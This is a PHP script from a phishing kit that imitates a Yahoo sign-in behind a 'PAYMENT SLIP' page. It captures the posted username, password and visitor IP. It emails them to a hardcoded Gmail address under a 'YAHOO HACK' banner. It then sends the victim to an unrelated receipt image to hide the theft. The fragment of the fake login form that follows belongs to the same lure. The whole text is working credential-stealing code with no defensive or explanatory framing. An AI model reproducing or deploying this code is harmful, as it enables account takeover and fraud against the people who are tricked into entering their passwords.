
<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-========================YAHOO HACK==============================-\n";
$message .= "YAHOO User & Pass \n";
$message .= "------------------------------------------------------------------\n";
$message .= "TEXT : ".$_POST['user_name']."\n";
$message .= "PASSWORD " .$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-============================by NETWISE=============================-\n";
 // Write/Mail Get Victim Dates





$recipient = "christocity0505@gmail.com";
$subject = "Online TTcopy Info";
$headers = "From: Online TTcopy ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0n";
	 mail("$to", "YAHOO Info", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://gigaom2.files.wordpress.com/2011/05/transportation-receipt3.jpg");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>
<title>PAYMENT SLIP</title>


<form method="post" action="act.php" name="login_form">
            <table id="yreglgtb" summary="form: login information">
